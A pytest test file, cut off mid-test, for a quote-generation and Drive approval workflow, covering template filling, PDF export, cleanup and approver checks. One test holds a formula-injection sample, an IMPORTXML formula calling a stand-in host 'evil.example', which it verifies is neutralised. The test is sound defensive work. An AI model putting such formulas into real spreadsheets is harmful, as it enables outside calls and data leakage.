from __future__ import annotations

from datetime import date, datetime, timezone

import pytest

from src.document_generation.common import TemplateNotFoundError, TemplateSheetNotFoundError
from src.document_generation.drive_connection_db import RepDriveConnection
from src.document_generation.quote_generator import (
    DriveNotConnectedError,
    DuplicateApprovalRequestError,
    InvalidApproverEmailError,
    QUOTE_PENDING_APPROVAL_FOLDER_ID,
    QuoteOverrides,
    generate_quote,
    request_quote_approval,
)
from src.document_generation.template_registry import TemplateInfo
from tests.document_generation._fakes import (
    FakeClientMasterClient,
    FakeGoogleDriveDocClient,
    FakeProjectNotionClient,
    FakeSheetsClient,
    FakeTemplateRegistry,
    build_raw_project_page,
)

PAGE_ID = "abcd1234-0000-0000-0000-000000000000"
SHEET_NAME = "案件Aタブ"


@pytest.fixture(autouse=True)
def _default_quote_sequence(monkeypatch: pytest.MonkeyPatch) -> None:
    """見積書NOの当日発行連番はPostgresへ実際に問い合わせる(`quote_number_db.
    next_sequence_for_date`)ため、DB接続の無いテスト環境では既定で固定値(1)を返す
    フェイクに差し替えておく。連番の値そのものを検証したいテストは個別に上書きする。"""
    monkeypatch.setattr("src.document_generation.quote_generator.next_sequence_for_date", lambda date_prefix: 1)


def test_generate_quote_copies_fills_exports_and_deletes(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 7))
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    rows = [
        ["", "", "", "", "", "発行日：", "", "2026/8/7", "", ""],
        ["", "", "", "", "", "見積書NO：", "", "CN20251001K01", "", ""],
        ["〇〇　御中", "", "", "", "", "", "", "", "", ""],
        ["", "", "件名：", "", "", "", "", "", "", ""],
    ]
    sheets_client = FakeSheetsClient(rows, sheet_title=SHEET_NAME)

    result = generate_quote(
        PAGE_ID,
        registry=registry,
        drive_client=drive_client,
        sheets_client=sheets_client,
        notion_client=FakeProjectNotionClient(raw_page),
        client_master_client=FakeClientMasterClient("テスト商店"),
    )

    # コピー -> 書き込み -> export -> 削除の順序・引数を検証。
    assert drive_client.copy_calls == [
        {
            "file_id": "TEMPLATE_ID",
            "target_mime_type": "application/vnd.google-apps.spreadsheet",
            "new_name": f"__tmp_quote_{PAGE_ID}",
            "parents": None,
        }
    ]
    assert drive_client.export_calls == [{"file_id": "copy-123", "mime_type": "application/pdf"}]
    assert drive_client.deleted_ids == ["copy-123"]

    assert sheets_client.updates[f"'{SHEET_NAME}'!H1"] == "2026/08/07"
    # 見積書NOは正式ルール: CN{YYYYMMDD}{作成者頭文字1字}{当日発行連番2桁}。作成者は
    # 案件データ(担当メンバー)の"金沢"、連番はフィクスチャで固定した1。
    assert sheets_client.updates[f"'{SHEET_NAME}'!H2"] == "CN20260807金01"
    assert sheets_client.updates[f"'{SHEET_NAME}'!A3"] == "テスト商店　御中"
    assert sheets_client.updates[f"'{SHEET_NAME}'!D4"] == "テスト案件"
    # Drive APIのexportはワークブック全体を書き出してしまうため、対象タブ以外を削除して
    # から export する必要がある（情報漏洩リスク対応の回帰確認）。
    assert sheets_client.keep_only_sheet_calls == [
        {"spreadsheet_id": "copy-123", "sheet_id": sheets_client.sheet_id}
    ]

    assert result.content == b"binary-content"
    assert result.mime_type == "application/pdf"
    assert result.file_name == "テスト案件_見積書.pdf"


def test_generate_quote_deletes_copy_even_when_export_fails(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 7))
    raw_page = build_raw_project_page(page_id=PAGE_ID)
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="x.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()

    def _raise_export(*args: object, **kwargs: object) -> bytes:
        raise RuntimeError("export failed")

    drive_client.export = _raise_export  # type: ignore[assignment]
    sheets_client = FakeSheetsClient([], sheet_title=SHEET_NAME)

    with pytest.raises(RuntimeError):
        generate_quote(
            PAGE_ID,
            registry=registry,
            drive_client=drive_client,
            sheets_client=sheets_client,
            notion_client=FakeProjectNotionClient(raw_page),
            client_master_client=FakeClientMasterClient("テスト商店"),
        )

    assert drive_client.deleted_ids == ["copy-123"]


def test_generate_quote_raises_template_sheet_not_found_when_template_tab_missing() -> None:
    """実データ回帰確認: テンプレートのスプレッドシートに「雛形」タブが無い場合、
    他クライアントのタブを誤って使わずエラーにする。"""
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    sheets_client = FakeSheetsClient(has_template_sheet=False)

    with pytest.raises(TemplateSheetNotFoundError):
        generate_quote(
            PAGE_ID,
            registry=registry,
            drive_client=drive_client,
            sheets_client=sheets_client,
            notion_client=FakeProjectNotionClient(raw_page),
            client_master_client=FakeClientMasterClient(),
        )

    # コピー自体は作られているため、一時ファイルの削除は行われる。
    assert drive_client.deleted_ids == ["copy-123"]


def test_generate_quote_raises_template_not_found_when_service_unmapped() -> None:
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["その他"])
    registry = FakeTemplateRegistry({})
    drive_client = FakeGoogleDriveDocClient()

    with pytest.raises(TemplateNotFoundError):
        generate_quote(
            PAGE_ID,
            registry=registry,
            drive_client=drive_client,
            sheets_client=FakeSheetsClient(),
            notion_client=FakeProjectNotionClient(raw_page),
            client_master_client=FakeClientMasterClient(),
        )

    assert drive_client.copy_calls == []


def test_generate_quote_raises_template_not_found_when_no_matching_template_in_db() -> None:
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    registry = FakeTemplateRegistry({})  # DB未登録
    drive_client = FakeGoogleDriveDocClient()

    with pytest.raises(TemplateNotFoundError):
        generate_quote(
            PAGE_ID,
            registry=registry,
            drive_client=drive_client,
            sheets_client=FakeSheetsClient(),
            notion_client=FakeProjectNotionClient(raw_page),
            client_master_client=FakeClientMasterClient(),
        )

    assert drive_client.copy_calls == []


def test_generate_quote_adds_note_when_client_name_missing() -> None:
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"], client_master_ids=[])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="x.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    sheets_client = FakeSheetsClient([], sheet_title=SHEET_NAME)

    result = generate_quote(
        PAGE_ID,
        registry=registry,
        drive_client=drive_client,
        sheets_client=sheets_client,
        notion_client=FakeProjectNotionClient(raw_page),
        client_master_client=FakeClientMasterClient(),
    )

    assert any("取引先名" in note for note in result.notes)


def test_generate_quote_applies_overrides_over_notion_data(monkeypatch: pytest.MonkeyPatch) -> None:
    """手動入力欄(overrides)はNotion案件データより優先される。商材名・初期費用・月額費用は
    Notion側に対応項目が無いため、overridesからのみ差し込まれる。"""
    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 19))
    monkeypatch.setattr(
        "src.document_generation.quote_generator.next_sequence_for_date", lambda date_prefix: 3
    )
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"], memo="元のメモ")
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    rows = [
        ["", "", "", "", "", "見積書NO：", "", "", "", ""],
        ["", "", "", "", "", "担当：", "", "", "", ""],
        ["", "", "", "", "", "注意事項：", "", "", "", ""],
        ["", "", "", "", "", "商材名：", "", "", "", ""],
        ["", "", "", "", "", "初期費用：", "", "", "", ""],
        ["", "", "", "", "", "月額費用：", "", "", "", ""],
        ["〇〇　御中", "", "", "", "", "", "", "", "", ""],
    ]
    sheets_client = FakeSheetsClient(rows, sheet_title=SHEET_NAME)

    overrides = QuoteOverrides(
        memo="上書きメモ",
        client_name="上書き商店",
        service_name="ホテマ",
        initial_fee="100,000円",
        monthly_fee="30,000円",
        creator_name="Kanazawa",
    )
    generate_quote(
        PAGE_ID,
        registry=registry,
        drive_client=drive_client,
        sheets_client=sheets_client,
        notion_client=FakeProjectNotionClient(raw_page),
        client_master_client=FakeClientMasterClient("テスト商店"),
        overrides=overrides,
    )

    # ラベル右隣に既存値が無いため、書き込み先はラベル列(F=index5)の次列G(index6)になる
    # （`sheet_filler._find_target_column`のフォールバック仕様）。
    # 作成者頭文字は overrides.creator_name の先頭1文字("K")、連番はmonkeypatchした3。
    assert sheets_client.updates[f"'{SHEET_NAME}'!G1"] == "CN20260819K03"
    assert sheets_client.updates[f"'{SHEET_NAME}'!G2"] == "Kanazawa"
    assert sheets_client.updates[f"'{SHEET_NAME}'!G3"] == "上書きメモ"
    assert sheets_client.updates[f"'{SHEET_NAME}'!G4"] == "ホテマ"
    assert sheets_client.updates[f"'{SHEET_NAME}'!G5"] == "100,000円"
    assert sheets_client.updates[f"'{SHEET_NAME}'!G6"] == "30,000円"
    # 宛先セルもoverrides.client_name（Notionの"テスト商店"ではなく）が使われる。
    assert sheets_client.updates[f"'{SHEET_NAME}'!A7"] == "上書き商店　御中"


def test_generate_quote_blank_override_falls_back_to_notion_value(monkeypatch: pytest.MonkeyPatch) -> None:
    """空文字列のoverrideは「未入力」として扱われ、Notion案件データの値が使われる。"""
    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 19))
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"], memo="元のメモ")
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    rows = [["", "", "", "", "", "注意事項：", "", "", "", ""]]
    sheets_client = FakeSheetsClient(rows, sheet_title=SHEET_NAME)

    generate_quote(
        PAGE_ID,
        registry=registry,
        drive_client=drive_client,
        sheets_client=sheets_client,
        notion_client=FakeProjectNotionClient(raw_page),
        client_master_client=FakeClientMasterClient("テスト商店"),
        overrides=QuoteOverrides(memo="   "),
    )

    assert sheets_client.updates[f"'{SHEET_NAME}'!G1"] == "元のメモ"


def test_generate_quote_sanitizes_override_values_starting_with_formula_trigger_chars(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """手動入力欄の値がGoogle Sheetsの数式として評価されないよう、`=`/`+`/`-`/`@`始まりの
    値には`'`を前置してテキストとして強制する（shirokuma-secレビューWARN対応、
    formula injection対策）。"""
    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 19))
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    rows = [
        ["", "", "", "", "", "初期費用：", "", "", "", ""],
        ["〇〇　御中", "", "", "", "", "", "", "", "", ""],
    ]
    sheets_client = FakeSheetsClient(rows, sheet_title=SHEET_NAME)

    generate_quote(
        PAGE_ID,
        registry=registry,
        drive_client=drive_client,
        sheets_client=sheets_client,
        notion_client=FakeProjectNotionClient(raw_page),
        client_master_client=FakeClientMasterClient(),
        overrides=QuoteOverrides(
            initial_fee='=IMPORTXML("http://evil.example/", "//a")',
            client_name="+81-invoice",
        ),
    )

    assert sheets_client.updates[f"'{SHEET_NAME}'!G1"] == "'=IMPORTXML(\"http://evil.example/\", \"//a\")"
    assert sheets_client.updates[f"'{SHEET_NAME}'!A2"] == "'+81-invoice　御中"


def test_generate_quote_adds_note_when_creator_name_unresolved(monkeypatch: pytest.MonkeyPatch) -> None:
    """作成者がNotion案件データにも手動入力欄にも無く見積書NOが"X"採番になった場合、
    理由を送付前確認欄(notes)に明示する（obasan-qualityレビューWARN対応）。"""
    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 19))
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"], assignee_name=None)
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    sheets_client = FakeSheetsClient([], sheet_title=SHEET_NAME)

    result = generate_quote(
        PAGE_ID,
        registry=registry,
        drive_client=drive_client,
        sheets_client=sheets_client,
        notion_client=FakeProjectNotionClient(raw_page),
        client_master_client=FakeClientMasterClient(),
    )

    assert any("仮の「X」で採番" in note for note in result.notes)


# --- request_quote_approval (見積書 承認フロー、2026-08-18) ----------------------------------


def _patch_drive_connection(
    monkeypatch: pytest.MonkeyPatch, *, connection: RepDriveConnection | None
) -> None:
    monkeypatch.setattr(
        "src.document_generation.quote_generator.get_rep_drive_connection", lambda rep_email: connection
    )


def _patch_approver_and_duplicate_checks(
    monkeypatch: pytest.MonkeyPatch, *, approver_active: bool = True, duplicate: bool = False
) -> None:
    """`is_active_document_approver`/`find_in_progress_approval`はDBアクセスを伴うため、
    request_quote_approval()を呼ぶテストでは既定でパスする値に固定しておく
    （どちらも異常系専用のテストで個別に上書きする）。"""
    monkeypatch.setattr(
        "src.document_generation.quote_generator.is_active_document_approver",
        lambda email: approver_active,
    )
    monkeypatch.setattr(
        "src.document_generation.quote_generator.find_in_progress_approval",
        lambda notion_page_id, category: "existing-row-id" if duplicate else None,
    )


def test_request_quote_approval_raises_when_approver_not_registered(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """approver_emailsがDocumentApproverに未登録(active=trueで存在しない)メールアドレスを
    含む場合、Driveへは一切アクセスせずInvalidApproverEmailErrorを送出する
    (shirokuma-secレビューBLOCKER対応)。"""
    _patch_approver_and_duplicate_checks(monkeypatch, approver_active=False)
    drive_client = FakeGoogleDriveDocClient()
    monkeypatch.setattr(
        "src.document_generation.quote_generator.GoogleDriveDocClient", lambda **kwargs: drive_client
    )

    with pytest.raises(InvalidApproverEmailError, match="approver@example.com"):
        request_quote_approval(
            PAGE_ID,
            approver_emails=["approver@example.com"],
            requested_by_email="rep@example.com",
            registry=FakeTemplateRegistry({}),
        )

    assert drive_client.copy_calls == []


def test_request_quote_approval_raises_when_approver_emails_empty(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """承認者を1人も選択していない場合、Driveへは一切アクセスせず
    InvalidApproverEmailErrorを送出する。"""
    _patch_approver_and_duplicate_checks(monkeypatch)
    drive_client = FakeGoogleDriveDocClient()
    monkeypatch.setattr(
        "src.document_generation.quote_generator.GoogleDriveDocClient", lambda **kwargs: drive_client
    )

    with pytest.raises(InvalidApproverEmailError, match="承認者を1人以上選択してください"):
        request_quote_approval(
            PAGE_ID,
            approver_emails=[],
            requested_by_email="rep@example.com",
            registry=FakeTemplateRegistry({}),
        )

    assert drive_client.copy_calls == []


def test_request_quote_approval_raises_when_one_of_multiple_approvers_not_registered(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """複数承認者のうち1件でも未登録の場合、Driveへは一切アクセスせず
    InvalidApproverEmailErrorを送出する(未登録分のみをメッセージに含める)。"""
    registered = {"approver@example.com"}
    monkeypatch.setattr(
        "src.document_generation.quote_generator.is_active_document_approver",
        lambda email: email in registered,
    )
    monkeypatch.setattr(
        "src.document_generation.quote_generator.find_in_progress_approval",
        lambda notion_page_id, category: None,
    )
    drive_client = FakeGoogleDriveDocClient()
    monkeypatch.setattr(
        "src.document_generation.quote_generator.GoogleDriveDocClient", lambda **kwargs: drive_client
    )

    with pytest.raises(InvalidApproverEmailError, match="outsider@example.com"):
        request_quote_approval(
            PAGE_ID,
            approver_emails=["approver@example.com", "outsider@example.com"],
            requested_by_email="rep@example.com",
            registry=FakeTemplateRegistry({}),
        )

    assert drive_client.copy_calls == []


def test_request_quote_approval_raises_when_duplicate_in_progress_request_exists(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """同じ案件・カテゴリで既にin_progressの承認リクエストがある場合、Driveへは一切
    アクセスせずDuplicateApprovalRequestErrorを送出する。"""
    _patch_approver_and_duplicate_checks(monkeypatch, duplicate=True)
    drive_client = FakeGoogleDriveDocClient()
    monkeypatch.setattr(
        "src.document_generation.quote_generator.GoogleDriveDocClient", lambda **kwargs: drive_client
    )

    with pytest.raises(DuplicateApprovalRequestError, match=PAGE_ID):
        request_quote_approval(
            PAGE_ID,
            approver_emails=["approver@example.com"],
            requested_by_email="rep@example.com",
            registry=FakeTemplateRegistry({}),
        )

    assert drive_client.copy_calls == []


def test_request_quote_approval_raises_when_rep_not_connected(monkeypatch: pytest.MonkeyPatch) -> None:
    """依頼者本人がDrive連携(RepDriveConnection)未接続の場合、Driveへは一切アクセスせず
    DriveNotConnectedErrorを送出する。"""
    _patch_approver_and_duplicate_checks(monkeypatch)
    _patch_drive_connection(monkeypatch, connection=None)
    drive_client = FakeGoogleDriveDocClient()
    monkeypatch.setattr(
        "src.document_generation.quote_generator.GoogleDriveDocClient", lambda **kwargs: drive_client
    )

    with pytest.raises(DriveNotConnectedError, match="rep@example.com"):
        request_quote_approval(
            PAGE_ID,
            approver_emails=["approver@example.com"],
            requested_by_email="rep@example.com",
            registry=FakeTemplateRegistry({}),
        )

    assert drive_client.copy_calls == []


def test_request_quote_approval_copies_into_pending_folder_and_starts_approval(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 18))
    _patch_approver_and_duplicate_checks(monkeypatch)
    connection = RepDriveConnection(
        rep_email="rep@example.com",
        refresh_token_enc="encrypted-refresh-token",
        connected_at=datetime(2026, 8, 1, tzinfo=timezone.utc),
    )
    _patch_drive_connection(monkeypatch, connection=connection)
    monkeypatch.setattr(
        "src.document_generation.quote_generator.decrypt_token", lambda enc: f"decrypted:{enc}"
    )
    monkeypatch.setattr(
        "src.document_generation.quote_generator.refresh_access_token",
        lambda refresh_token: f"access-token-for:{refresh_token}",
    )
    captured_access_tokens: list[str | None] = []

    def _fake_drive_client(*, access_token: str | None = None) -> FakeGoogleDriveDocClient:
        captured_access_tokens.append(access_token)
        return drive_client

    def _fake_sheets_client(*, access_token: str | None = None) -> "FakeSheetsClient":
        captured_access_tokens.append(access_token)
        return sheets_client

    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    sheets_client = FakeSheetsClient([], sheet_title=SHEET_NAME)
    monkeypatch.setattr("src.document_generation.quote_generator.GoogleDriveDocClient", _fake_drive_client)
    monkeypatch.setattr(
        "src.document_generation.quote_generator.HttpSheetsValuesClient", _fake_sheets_client
    )

    inserted_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        "src.document_generation.quote_generator.insert_document_approval",
        lambda **kwargs: inserted_calls.append(kwargs) or "approval-row-id",
    )

    result = request_quote_approval(
        PAGE_ID,
        approver_emails=["approver@example.com"],
        requested_by_email="rep@example.com",
        message="ご確認お願いします",
        registry=registry,
        notion_client=FakeProjectNotionClient(raw_page),
        client_master_client=FakeClientMasterClient("テスト商店"),
    )

    # 依頼者本人のリフレッシュトークンを復号・更新して取得したアクセストークンで
    # Drive/Sheetsクライアントを構築していること(サービスアカウントを使わないこと)。
    assert captured_access_tokens == [
        "access-token-for:decrypted:encrypted-refresh-token",
        "access-token-for:decrypted:encrypted-refresh-token",
    ]

    # コピーは一時格納フォルダへ直接作成する(移動ではなく、コピー時にparentsを指定する
    # 実装方針。テンプレートの元の親フォルダIDが分からずmove()のremove_parentを特定できない
    # ため——計画書は「コピー→move()」としていたが、実装ではcopy_as_native(parents=...)を
    # 使う形に変更した。詳細は本ファイル冒頭のコミットメッセージ/報告を参照)。
    # ファイル名は案件名ベース(承認フローの成果物として永久保存されるため、内部的な
    # `__tmp_quote_{id}`のままにはしない。shirokuma-secレビューBLOCKER対応)。
    assert drive_client.copy_calls == [
        {
            "file_id": "TEMPLATE_ID",
            "target_mime_type": "application/vnd.google-apps.spreadsheet",
            "new_name": "テスト案件_見積書",
            "parents": [QUOTE_PENDING_APPROVAL_FOLDER_ID],
        }
    ]
    # セル差し込み後のSheetsコピーをPDFへ変換してから承認をリクエストする(2026-08-19、
    # 過去の承認履歴でPDFが送られていた運用実態に合わせた)。deleteはしない
    # (PDF化後のコピー自体が承認対象の成果物のため)。
    assert drive_client.export_calls == [{"file_id": "copy-123", "mime_type": "application/pdf"}]
    assert drive_client.replace_content_calls == [
        {"file_id": "copy-123", "content": b"binary-content", "mime_type": "application/pdf"}
    ]
    assert drive_client.rename_calls == [{"file_id": "copy-123", "name": "テスト案件_見積書.pdf"}]
    assert drive_client.deleted_ids == []

    assert drive_client.start_approval_calls == [
        {"file_id": "copy-123", "reviewer_emails": ["approver@example.com"], "message": "ご確認お願いします"}
    ]

    assert inserted_calls == [
        {
            "notion_project_id": PAGE_ID,
            "category": "見積書",
            "drive_file_id": "copy-123",
            "drive_approval_id": "approval-1",
            "approver_emails": ["approver@example.com"],
            "requested_by_email": "rep@example.com",
        }
    ]

    assert result.drive_file_id == "copy-123"
    assert result.drive_approval_id == "approval-1"
    assert result.document_approval_id == "approval-row-id"


def test_request_quote_approval_deletes_copy_and_does_not_create_approval_row_when_fill_fails(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """コピー・差し込みロジック自体が失敗した場合(雛形タブ未検出等)は、一時コピーを削除し、
    DocumentApproval行も作らない(generate_quoteと同じ後片付け方針を共有する)。"""
    _patch_approver_and_duplicate_checks(monkeypatch)
    connection = RepDriveConnection(
        rep_email="rep@example.com",
        refresh_token_enc="enc",
        connected_at=datetime(2026, 8, 1, tzinfo=timezone.utc),
    )
    _patch_drive_connection(monkeypatch, connection=connection)
    monkeypatch.setattr("src.document_generation.quote_generator.decrypt_token", lambda enc: "token")
    monkeypatch.setattr(
        "src.document_generation.quote_generator.refresh_access_token", lambda refresh_token: "access-token"
    )
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="x.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    sheets_client = FakeSheetsClient(has_template_sheet=False)
    monkeypatch.setattr(
        "src.document_generation.quote_generator.GoogleDriveDocClient", lambda **kwargs: drive_client
    )
    monkeypatch.setattr(
        "src.document_generation.quote_generator.HttpSheetsValuesClient", lambda **kwargs: sheets_client
    )
    insert_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        "src.document_generation.quote_generator.insert_document_approval",
        lambda **kwargs: insert_calls.append(kwargs),
    )

    with pytest.raises(TemplateSheetNotFoundError):
        request_quote_approval(
            PAGE_ID,
            approver_emails=["approver@example.com"],
            requested_by_email="rep@example.com",
            registry=registry,
            notion_client=FakeProjectNotionClient(raw_page),
            client_master_client=FakeClientMasterClient(),
        )

    assert drive_client.deleted_ids == ["copy-123"]
    assert drive_client.start_approval_calls == []
    assert insert_calls == []


def _setup_request_quote_approval_success_dependencies(
    monkeypatch: pytest.MonkeyPatch, *, drive_client: FakeGoogleDriveDocClient
) -> None:
    """コピー・差し込みまでは成功させ、`start_approval`/DB書き込み以降の異常系だけを
    テストしたい場合の共通セットアップ。"""
    _patch_approver_and_duplicate_checks(monkeypatch)
    connection = RepDriveConnection(
        rep_email="rep@example.com",
        refresh_token_enc="enc",
        connected_at=datetime(2026, 8, 1, tzinfo=timezone.utc),
    )
    _patch_drive_connection(monkeypatch, connection=connection)
    monkeypatch.setattr("src.document_generation.quote_generator.decrypt_token", lambda enc: "token")
    monkeypatch.setattr(
        "src.document_generation.quote_generator.refresh_access_token", lambda refresh_token: "access-token"
    )
    monkeypatch.setattr(
        "src.document_generation.quote_generator.GoogleDriveDocClient", lambda **kwargs: drive_client
    )
    monkeypatch.setattr(
        "src.document_generation.quote_generator.HttpSheetsValuesClient",
        lambda **kwargs: FakeSheetsClient([], sheet_title=SHEET_NAME),
    )


def test_request_quote_approval_dedupes_approver_emails(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """同じメールアドレスが複数回指定されても、順序を保ったまま重複除去してから
    start_approval/insert_document_approvalへ渡す(2026-08-27複数承認者対応)。"""
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="x.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    _setup_request_quote_approval_success_dependencies(monkeypatch, drive_client=drive_client)
    inserted_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        "src.document_generation.quote_generator.insert_document_approval",
        lambda **kwargs: inserted_calls.append(kwargs) or "approval-row-id",
    )

    request_quote_approval(
        PAGE_ID,
        approver_emails=[
            "approver1@example.com",
            "approver2@example.com",
            "approver1@example.com",
        ],
        requested_by_email="rep@example.com",
        registry=registry,
        notion_client=FakeProjectNotionClient(raw_page),
        client_master_client=FakeClientMasterClient(),
    )

    assert drive_client.start_approval_calls == [
        {
            "file_id": "copy-123",
            "reviewer_emails": ["approver1@example.com", "approver2@example.com"],
            "message": "",
        }
    ]
    assert inserted_calls[0]["approver_emails"] == ["approver1@example.com", "approver2@example.com"]


def test_request_quote_approval_deletes_copy_when_pdf_conversion_fails(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Sheets→PDF変換(export/replace_content)が失敗した場合も、孤立したコピーを削除して
    から例外を再送出する(start_approval失敗時と同じ後片付け方針、2026-08-19)。"""
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="x.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()

    def _raise_export(*args: object, **kwargs: object) -> bytes:
        raise RuntimeError("export failed")

    drive_client.export = _raise_export  # type: ignore[assignment]
    _setup_request_quote_approval_success_dependencies(monkeypatch, drive_client=drive_client)
    insert_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        "src.document_generation.quote_generator.insert_document_approval",
        lambda **kwargs: insert_calls.append(kwargs),
    )

    with pytest.raises(RuntimeError, match="export failed"):
        request_quote_approval(
            PAGE_ID,
            approver_emails=["approver@example.com"],
            requested_by_email="rep@example.com",
            registry=registry,
            notion_client=FakeProjectNotionClient(raw_page),
            client_master_client=FakeClientMasterClient(),
        )

    assert drive_client.deleted_ids == ["copy-123"]
    assert drive_client.start_approval_calls == []
    assert insert_calls == []


def test_request_quote_approval_deletes_copy_when_start_approval_fails(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """start_approval()自体が失敗した場合、Drive上にコピーだけが孤立しないよう削除してから
    例外を再送出する(shirokuma-secレビューBLOCKER対応)。"""
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="x.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()

    def _raise_start_approval(*args: object, **kwargs: object) -> str:
        raise RuntimeError("start_approval failed")

    drive_client.start_approval = _raise_start_approval  # type: ignore[assignment]
    _setup_request_quote_approval_success_dependencies(monkeypatch, drive_client=drive_client)
    insert_calls: list[dict[str, object]] = []
    monkeypatch.setattr(
        "src.document_generation.quote_generator.insert_document_approval",
        lambda **kwargs: insert_calls.append(kwargs),
    )

    with pytest.raises(RuntimeError, match="start_approval failed"):
        request_quote_approval(
            PAGE_ID,
            approver_emails=["approver@example.com"],
            requested_by_email="rep@example.com",
            registry=registry,
            notion_client=FakeProjectNotionClient(raw_page),
            client_master_client=FakeClientMasterClient(),
        )

    assert drive_client.deleted_ids == ["copy-123"]
    assert insert_calls == []


def test_request_quote_approval_cancels_drive_approval_when_db_insert_fails(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """start_approval()成功後にDB書き込み(insert_document_approval)が失敗した場合、Drive側に
    記録なしのin_progress承認リクエストが残り続けないようcancel_approval()で取り消す
    (shirokuma-secレビューBLOCKER対応)。"""
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="x.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()
    _setup_request_quote_approval_success_dependencies(monkeypatch, drive_client=drive_client)

    def _raise_insert(**kwargs: object) -> str:
        raise RuntimeError("db insert failed")

    monkeypatch.setattr(
        "src.document_generation.quote_generator.insert_document_approval", _raise_insert
    )

    with pytest.raises(RuntimeError, match="db insert failed"):
        request_quote_approval(
            PAGE_ID,
            approver_emails=["approver@example.com"],
            requested_by_email="rep@example.com",
            registry=registry,
